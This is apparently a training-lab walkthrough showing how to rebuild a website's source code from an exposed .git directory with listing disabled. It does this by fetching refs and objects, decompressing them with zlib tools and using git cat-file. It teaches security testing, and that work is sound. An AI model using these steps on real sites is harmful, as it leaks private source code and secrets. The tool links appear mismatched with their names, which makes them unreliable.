# Git Information Leak II

* This exercise details how to retrieve information from an exposed .git directory on a web server. This time, the directly listing is disabled

## Introduction

* In this exercise we are going to cover the exploitation of a website that leaks its `.git` repository in the root of the website. With modern URL mapping (i.e. not relaying on the filesystem) , it's less and less common to see this kind of issues but it's always important to look for them anyway.

## Exploitation

* Here, we can access the `.git` directory in the root of the web server directly. We can see that this time directory listing is disabled making the task of retrieving the content of the repository a bit more complex.

* First, we can recover some files:

    * `.git/config`

    * `.git/HEAD`

* From `.git/HEAD`, we can see that the `HEAD` is at `refs/heads/master`. We can therefore access this file: `.git/refs/heads/master`. From that file, we get a hash: `bc4f01bdd14060e4ac78b36972584909d287b6f1`. This will link us to another file: `.git/objects/bc/4f01bdd14060e4ac78b36972584909d287b6f1` (by using the first two bytes as a directory's name and the rest as the file's name.

* Once you download the file, you will need to decompress it. The compression is done using `zlib`. Unfortunately, most systems don't have a native tool to decompress zlib-compressed files. You can either use gzip:
```bash
printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - 4f01bdd14060e4ac78b36972584909d287b6f1 |gzip  -cd -q
```
or ruby (for example):
```ruby
ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < 4f01bdd14060e4ac78b36972584909d287b6f1
```
* From there, we get a new commit that we can download and check the content by deflating it and running `strings -a` on the result:
```ruby
$ ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < ace0476093d04023f84d7816adacfa7b879c43 | strings -a
tree 182
40000 css
100644 favicon.ico
s100644 footer.php
3100644 header.php
100644 index.php
```
```python
python -c "import sys;import zlib;fp=open(sys.argv[1]);print zlib.decompress(fp.read());fp.close();" $1
```
* Unfortunately, using strings does not give us the hash for each file. We can do is create our own local repo:
```bash
$ mkdir /tmp/hack
$ cd /tmp/hack
$ git init
```
And copy our files in it:
```bash
$ mkdir -p .git/objects/58 .git/objects/bc
$ cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
$ cp /tmp/4f01bdd14060e4ac78b36972584909d287b6f1 /tmp/hack/.git/objects/bc/
```
Then we should be able to retrieve the list of hashes:
```bash
% git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
040000 tree b352dde43705f193d2c1d4e6f6a133321186869f    css
100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873    favicon.ico
100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33    footer.php
100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82    header.php
100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c    index.php
```
* Once you're there, you can keep downloading the files and copying them in the right spot to get access to the full code using `git cat-file -p ....`

* Some tools like [`Git-Money`](https://github.com/internetwache/GitTools), [`DVCS-Pillage`](https://github.com/evilpacket/DVCS-Pillage) and [`GitTools`](https://github.com/dnoiz1/git-money/blob/master/fbgm.py) automate the retrieval of the remote content.

* With this information, you should be able to find the key to solve this exercise that is hidden in the PHP comment of one of the `.php` file.

## Conclusion

* This exercise showed you how you can download the source code of a website if the `.git` repository is exposed.

* You can access this exercise using the following URL: http://ptl-3bb02cfa-fa109af6.libcurl.so/ 
